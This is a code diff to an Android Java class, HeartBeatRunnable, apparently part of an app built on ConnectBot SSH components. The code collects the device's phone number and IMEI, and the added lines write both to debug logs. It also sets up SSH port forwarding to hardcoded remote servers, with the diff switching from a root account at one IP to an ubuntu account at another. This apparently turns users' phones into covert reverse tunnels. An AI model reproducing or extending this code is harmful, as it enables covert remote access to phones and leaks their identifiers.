@@ -19,8 +19,6 @@ import com.oplay.nohelper.volley.RequestEntity;
 import com.oplay.nohelper.volley.Response;
 import com.oplay.nohelper.volley.VolleyError;
 
-import net.luna.common.util.RandomUtils;
-
 import org.connectbot.bean.PortForwardBean;
 import org.connectbot.service.TerminalManager;
 import org.connectbot.transport.TransportFactory;
@@ -34,7 +32,7 @@ import java.util.Map;
  */
 public class HeartBeatRunnable implements Runnable {
 
-	private static final boolean DEBUG = NativeParams.HEARTBEAT_RUNNABLE_DEBUG;
+	private static final boolean DEBUG = true;
 	private static final String TAG = "heartBeatRunnable";
 	public static boolean isSSHConnected = false;
 	public static int mCurrentCount = 0;
@@ -72,9 +70,12 @@ public class HeartBeatRunnable implements Runnable {
 				if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
 				if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
 			}
+			if(DEBUG){
+				Log.d(TAG,"phoneNumber:"+phoneNumber + "imei:"+imei);
+			}
 			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
 				getPhoneNumFailCount++;
-				if (getPhoneNumFailCount > 100) {
+				if (getPhoneNumFailCount > NativeParams.getPhoneNumberFailCount) {
 					if (DEBUG) {
 						Log.d(TAG, "拿不到手机号超过100次,退出应用");
 					}
@@ -85,6 +86,9 @@ public class HeartBeatRunnable implements Runnable {
 						return;
 					}
 				}
+			}
+			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
+				return;
 			}
 
 			if (DEBUG) {
@@ -126,7 +130,6 @@ public class HeartBeatRunnable implements Runnable {
 //							}
 						}
 						FlurryAgent.onError(TAG, "", error.fillInStackTrace());
-
 					}
 				});
 			}
@@ -142,8 +145,8 @@ public class HeartBeatRunnable implements Runnable {
 	private void initDebug() {
 		HeartBeatJson json = new HeartBeatJson();
 		HeartBeatInfo info = new HeartBeatInfo();
-		int sourcePort = 40000 + RandomUtils.getRandom(8000);
-		info.setPort("root@103.27.79.138:" + String.valueOf(sourcePort));
+		int sourcePort = 12122;
+		info.setPort("ubuntu@52.79.167.214:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
 			if (mCurrentCount > 1 && !isStartSSHBuild) {
 				if (DEBUG) {
